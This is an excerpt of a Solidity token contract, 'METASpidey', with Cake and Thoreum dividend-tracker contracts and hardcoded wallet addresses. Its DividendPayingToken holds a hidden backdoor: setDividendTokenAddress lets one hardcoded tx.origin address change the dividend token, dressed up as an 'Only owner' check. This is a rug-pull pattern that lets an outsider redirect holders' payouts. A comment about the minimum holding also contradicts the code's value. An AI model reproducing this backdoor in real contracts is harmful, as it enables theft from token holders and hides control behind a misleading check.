...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x693f2c607b06f58D2d84A17Bb33e54Ac7892A347, "Only owner");
...
contract METASpidey is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("METASpidey", "MTS") {
        cakeDividendTracker = new CakeDividendTracker();
        thoreumDividendTracker = new ThoreumDividendTracker();

        marketingWallet = 0x98B01259f0Dc9e7aCbE4fe7a306c41F912A46E77;
        teamWallet = 0xf44E62BB056790cfD4A26799d50971E68ffCE2D7;
        cakeDividendToken = 0x1CE0c2827e2eF14D5C4f29a091d735A204794041;
        thoreumDividendToken = 0xD40bEDb44C081D2935eebA6eF5a3c8A31A1bBE13;
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Cake_Dividend_Tracker", "Cake_Dividend_Tracker", 0x1CE0c2827e2eF14D5C4f29a091d735A204794041) {
        claimWait = 3600;
...
contract ThoreumDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Thoreum_Dividend_Tracker", "Thoreum_Dividend_Tracker", 0xD40bEDb44C081D2935eebA6eF5a3c8A31A1bBE13) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }
